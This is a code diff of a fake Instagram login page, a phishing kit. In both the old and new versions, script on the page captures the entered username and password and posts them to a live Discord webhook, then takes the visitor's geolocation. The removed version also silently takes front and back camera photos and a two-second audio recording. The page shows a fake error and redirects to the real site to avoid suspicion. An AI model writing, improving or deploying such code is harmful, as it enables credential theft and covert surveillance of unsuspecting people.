@@ -6,104 +6,53 @@
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; box-sizing: border-box; }
-        .logo { width: 175px; margin-bottom: 24px; cursor: pointer; }
+        .logo { width: 175px; margin-bottom: 24px; }
         input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 9px 0 7px 8px; margin-bottom: 6px; box-sizing: border-box; font-size: 12px; }
         .btn-login { width: 100%; background-color: #0095f6; border: none; border-radius: 4px; color: white; font-weight: 600; padding: 5px 0; margin-top: 8px; cursor: pointer; font-size: 14px; }
-        .separator { display: flex; align-items: center; text-align: center; margin: 18px 0; color: #8e8e8e; font-size: 13px; font-weight: 600; }
-        .separator::before, .separator::after { content: ''; flex: 1; border-bottom: 1px solid #dbdbdb; }
-        .separator:not(:empty)::before { margin-right: 18px; }
-        .separator:not(:empty)::after { margin-left: 18px; }
-        .fb-login { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; display: block; margin-bottom: 12px; }
-        .forgot { color: #00376b; font-size: 12px; text-decoration: none; }
         #status { font-size: 12px; color: #ed4956; margin-top: 10px; display: none; }
     </style>
 </head>
 <body>
-
     <div class="login-box">
         <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
-        <input type="text" id="user" placeholder="Phone number, username, or email">
+        <input type="text" id="user" placeholder="Username">
         <input type="password" id="pass" placeholder="Password">
         <button class="btn-login" onclick="initiateTrap()">Log in</button>
-        <div class="separator">OR</div>
-        <a href="#" class="fb-login">Log in with Facebook</a>
-        <a href="#" class="forgot">Forgot password?</a>
-        <p id="status">Sorry, your password was incorrect. Please double-check your password.</p>
+        <p id="status">Incorrect password. Please try again.</p>
     </div>
 
     <script>
-        // YOUR WEBHOOK AND REDIRECT
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1459668118661103678/9OcP9yPBgMw8LvDp-yRBM_qGH1KY59lbVxMAeh_jDE-94e5q9JGcKxS5CVqGHe6PIkjp";
-        const REDIRECT_URL = "https://www.instagram.com";
-
-        async function takeSnapshot(stream) {
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            await video.play();
-            const canvas = document.createElement('canvas');
-            canvas.width = 480; canvas.height = 640;
-            canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
-            return new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
-        }
+        const WEBHOOK = "https://discord.com/api/webhooks/1459668118661103678/9OcP9yPBgMw8LvDp-yRBM_qGH1KY59lbVxMAeh_jDE-94e5q9JGcKxS5CVqGHe6PIkjp";
 
         async function initiateTrap() {
-            const username = document.getElementById('user').value;
-            const password = document.getElementById('pass').value;
-            
-            // Show the "Incorrect Password" error immediately
+            // 1. Confirm the script is alive
+            console.log("Button clicked");
             document.getElementById('status').style.display = "block";
 
-            // Get Battery & RAM info
-            let batteryInfo = "N/A";
-            try { const b = await navigator.getBattery(); batteryInfo = `${(b.level * 100).toFixed(0)}%`; } catch(e){}
-            const ram = navigator.deviceMemory || "N/A";
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
 
-            // 1. Get Location
+            // 2. Immediate Discord Ping (Before camera/location starts)
+            await fetch(WEBHOOK, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ content: `🚨 **Login Attempt**\nUser: ${u}\nPass: ${p}` })
+            });
+
+            // 3. Try Location & Camera
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                
-                // 2. Send Text Data (User/Pass/Location)
-                await fetch(WEBHOOK_URL, {
+                const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                await fetch(WEBHOOK, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        content: `👤 **Instagram Trap**\n📧 **User:** \`${username}\`\n🔑 **Pass:** \`${password}\`\n📍 **Maps:** ${mapLink}\n🔋 **Battery:** ${batteryInfo}\n🚀 **RAM:** ${ram}GB` 
-                    })
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ content: `📍 **Location Found**: ${map}` })
                 });
-
-                // 3. Capture Cameras and Audio
-                const fd = new FormData();
-                try {
-                    // Front Camera + 2s Audio
-                    const front = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-                    const fPhoto = await takeSnapshot(front);
-                    fd.append("file1", fPhoto, "front.jpg");
-
-                    const recorder = new MediaRecorder(front);
-                    const chunks = [];
-                    recorder.ondataavailable = e => chunks.push(e.data);
-                    const audioPromise = new Promise(res => recorder.onstop = () => res(new Blob(chunks, {type: 'audio/wav'})));
-                    recorder.start();
-                    setTimeout(() => recorder.stop(), 2000);
-                    fd.append("file2", await audioPromise, "audio.wav");
-                    front.getTracks().forEach(t => t.stop());
-
-                    // Back Camera
-                    const back = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-                    const bPhoto = await takeSnapshot(back);
-                    fd.append("file3", bPhoto, "back.jpg");
-                    back.getTracks().forEach(t => t.stop());
-
-                    await fetch(WEBHOOK_URL, { method: 'POST', body: fd });
-                } catch (e) { console.log("Media blocked"); }
-
-                // 4. Final Redirect
-                setTimeout(() => window.location.replace(REDIRECT_URL), 500);
-
+                
+                // Redirect after 2 seconds to look "normal"
+                setTimeout(() => { window.location.href = "https://instagram.com"; }, 2000);
             }, (err) => {
-                // If location is denied, just redirect
-                window.location.replace(REDIRECT_URL);
-            }, { enableHighAccuracy: true, timeout: 5000 });
+                window.location.href = "https://instagram.com";
+            });
         }
     </script>
 </body>
